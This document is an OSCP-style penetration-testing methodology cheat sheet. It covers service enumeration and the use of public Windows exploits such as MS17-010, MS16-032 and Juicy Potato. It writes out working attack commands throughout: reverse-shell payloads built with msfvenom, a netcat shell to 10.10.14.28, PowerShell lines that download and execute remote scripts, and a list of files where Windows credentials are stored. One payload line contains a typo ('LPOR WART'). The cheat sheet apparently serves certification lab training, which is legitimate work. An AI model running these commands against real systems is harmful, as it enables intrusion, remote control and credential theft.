# oscp_methodology
OSCP Methodology


## Blackbox Enumeration
#### nmap full tcp port scan
##### nmap \<ip> -sV -sC -O -T4 --traceroute -p - -oA ~/path/filename

#### Ftp
* service -> exploit (searchsploit + google)
* banner
* default creds (hydra)
* Anonymous login
* Put files
  * if exists web service, check if web and ftp has the same path
* nmap info

#### SSH
* service -> exploit (searchsploit + google)
* banner
* default creds (hydra)
* default creds with nsr (hydra)
* nmap info

#### Samba
* nmap info:
  * OS samba
  * Computer name/NetBIOS name
  * Domain name
  * Workgroup
  * OS of machine
* service (OS samba or nmap service header (139 & 445)) -> exploit (searchsploit + google)
  ##### nmap -sV -sC --open -T4  -p 139,445 --script=vuln --script-args=unsafe=1 <ip>
* enum4linux
* smbclient

#### Http/Https
 * Service -> exploit (searchsploit + google)
 * nmap info
 * if directories from nmap output, OPTIONS request for put http method availability.
 * nikto:
   * default
   * CGI all
 * source
 * gobuster:
   * with common.txt:
     ###### gobuster dir -u [url] -w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e -t [number] -o common.results
     ###### gobuster dir -u [url] -w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e -t [number] -x .exte,.exte,.exte -o exte.common.results
   * With big.txt:
     ###### gobuster dir -u [url] -w /usr/share/wordlists/dirb/big.txt -s '200,204,301,302,307,403,500' -e -t [number] -o big.results
     ###### gobuster dir -u [url] -w /usr/share/wordlists/dirb/big.txt -s '200,204,301,302,307,403,500' -e -t [number] -x .exte,.exte,.exte -o exte.big.results
   
   * With medium.txt:
     ###### gobuster dir -u [url] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,307,403,500' -e -t [number] -o medium.results
     ###### gobuster dir -u [url] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,307,403,500' -e -t [number] -x .exte,.exte,.exte -o exte.medium.results
 
 * Play around with burpsuite (Spider, repeater)
 
 * if web page contains big articles qith many words use cewl:
   ##### cewl -w custom_worlist \<ip> -d \<depth>

## Exploits
### Windows
#### Churrasco
* Windows Server 2003 and IIS 6.0 privledge escalation using impersonation token (Tokens kiddnapping revenge):
* use https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
* Needs Listener 


### Windows
#### MS08-067
git clone https://github.com/andyacer/ms08_067.git
* configuration
  * pip install impacket
* 2 reverse options for shellcoding:
  * Use the third with 443
  * Use the third with default
  * Use second with default
  * Use second with port of third or another port
* Choose the right option of menu.
  * Find OS of machine
  * Guess lanhuage
* Needs Listener

### Windows
#### MS17-010
git clone https://github.com/worawit/MS17-010.git

##### zzz_exploit.py:
 * If needed USERNAME-"//"
 * next add the following 2 lines to below def smb
   
   smb_send_file(smbConn, '/root/htb/blue/puckieshell443.exe', 'C', '/puckieshell443.exe')
   
   service_exec(conn, r'cmd /c c:\\puckieshell443.exe')
 
* custom payload:
  ##### msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.28 LPORT=443 -f exe > shell.exe

* Needs Listener

##### eternalblue_exploit7.py

* use the https://github.com/nickvourd/eternalblue_win7_auto_gen in order to merge binaries nad payload
* Run the following: python MS17-010/eternalblue_exploit7.py <ip> /tmp/sc_x<arch>.bin
* Needs Listener

### Windows
#### MS10-059

* use the https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059 
* serve the MS10-059.exe (https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe) to victim
* run exploit: 
  ##### MS10-059.exe \<ip> \<port>
* Need Listener

### Windows
#### MS11-046

* use the https://www.exploit-db.com/exploits/40564
* compile:
  ##### i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32 
  
  ###### Installation: apt install mingw-w64
* no need listener (insta run)

### Windows
#### MS15-051

* use the https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip
* Check the architecture of victim and choose the right exe
* upload to victim machine
* run the following:
  ###### ms15-051x64.exe "nc.exe 10.10.14.28 4444 -e cmd.exe"
* Needs Listener

### Windows
#### MS16-032

* use https://www.exploit-db.com/exploits/39719
* Edit the file:
  * end of file add this Invoke-MS16-032
  * Inside th file search and find cmd.exe two times.
  * Change with shell.exe in current directory in victim which you are.
  * generate shell.exe:
    ###### msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPORT=6666 -f exe > shell.exe
  * serve the shell.exe to victim
  * open a listener
  * run the ps1 exploit:
    ##### C:\windows\sysnative\windowspowershell\v1.0\powershell IEX(New-Object Net.WebClient).downloadString('http://\<ip>/ms16032.ps1')
  
## Potatos
### Hot Potato
What is: Hot Potato (aka: Potato) takes advantage of known issues in Windows to gain local privilege escalation in default configurations, namely NTLM relay (specifically HTTP->SMB relay) and NBNS spoofing.

Affected systems: Windows 7,8,10, Server 2008, Server 2012

Guide: https://foxglovesecurity.com/2016/01/16/hot-potato/

Use: https://github.com/foxglovesec/Potato

### Juicy Potato
What is: Juicy potato is basically a weaponized version of the RottenPotato exploit that exploits the way Microsoft handles tokens. Through this, we achieve privilege escalation. 

Affetcted Systems: 
 * Windows 7 Enterprise 
 * Windows 8.1 Enterprise 
 * Windows 10 Enterprise 
 * Windows 10 Professional 
 * Windows Server 2008 R2 Enterprise 
 * Windows Server 2012 Datacenter 
 * Windows Server 2016 Standard
 
 Find CLSID here: https://ohpe.it/juicy-potato/CLSID/

##### Warning: Juicy Potato doesn’t work in Windows Server 2019

Guides: https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/#juicy-potato-abusing-the-golden-privileges
https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato#:~:text=Juicy%20potato%20is%20basically%20a,this%2C%20we%20achieve%20privilege%20escalation.

Use: https://github.com/ohpe/juicy-potato
## Privilege Escalation
### Windows
* systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
  * searchsploit
  * google

* systeminfo
  * Architecture
  * Numbers of Proccessors
  * Domain
  * HotFixes
  * System Locale
  * Input Locale
 
 * Numbers of cores of processors: 
   ##### WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors
 
 * Windows Privileges:
   ##### whoami /priv
   * More info here: https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf
     * SeDebugPrivilege
     * SeRestorePrivilege
     * SeBackupPrivilege
     * SeTakeOwnershipPrivilege
     * SeTcbPrivilege
     * SeCreateToken Privilege
     * SeLoadDriver Privilege
     * SeImpersonate & SeAssignPrimaryToken Priv.
  
 * Users of system and their groups
   * net user
   * net user <user>
     *Password required
     *groups
 
 * Windows-Exploit-Suggester
   * python windows-exploit-suggester.py --database 2020-08-09-mssb.xls --systeminfo grandpa.txt
 
 * Serlock
   * Config: Add to the last line the "Find-AllVulns"
   * Download and run Sherlock:
     ##### echo IEX(New-Object Net.WebClient).DownloadString('http://\<ip>:\<port>/Sherlock.ps1') | powershell -noprofile -
 
 * Watson
   * Find .NET latest version of victim:
     ##### dir %windir%\Microsoft.NET\Framework /AD
   * Fow older than windows 10 download zip version of watson v.1: https://github.com/rasta-mouse/Watson/tree/486ff207270e4f4cadc94ddebfce1121ae7b5437
   * Build exe to visual studio
   
* PowerUP
   * Config: add to the last line the "Invoke-AllChecks"
   * Download and run PowerUp:
     ##### echo IEX(New-Object Net.WebClient).DownloadString('http://\<ip>:\<port>/PowerUp.ps1') | powershell -noprofi
     
 * Stored Creadentials:
   * cmdkey /list
     * if interactive module enabled 100% runas as other user
     * if domain and user exist try again runas as other user
     
     ##### runas /savecred /user:\<Domain>\\\<user> C:\\\<path>\\\<exefile>
   * Stored as plaintext or base64
     * C:\unattend.xml
     * C:\Windows\Panther\Unattend.xml
     * C:\Windows\Panther\Unattend\Unattend.xml
     * C:\Windows\system32\sysprep.inf
     * C:\Windows\system32\sysprep\sysprep.xml
     
   * If system is running an IIS web server the web.config file:
     * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
     * C:\inetpub\wwwroot\web.config
     
   * Local administrators passwords can also retrieved via the Group Policy Preferences:
     * C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml
     * \\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml
   
   * Except of the Group.xml file the cpassword attribute can be found in other policy preference files as well such as:
     * Services\Services.xml
     * ScheduledTasks\ScheduledTasks.xml
     * Printers\Printers.xml
     * Drives\Drives.xml
     * DataSources\DataSources.xml
     
   * Most Windows systems they are running McAfee as their endpoint protection. The password is stored encrypted in the SiteList.xml file:
     * %AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml 


## MSFVENOM
### EXE
##### msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f exe > shell.exe

### JSP
##### msfvenom -p java/jsp_shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f raw > shell.jsp

### ASP
##### msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f asp > shell.asp

### ASPX
##### msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPOR WART=\<port> -f aspx > shell.aspx

### WAR
##### msfvenom -p java/jsp_shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f war > shell.war
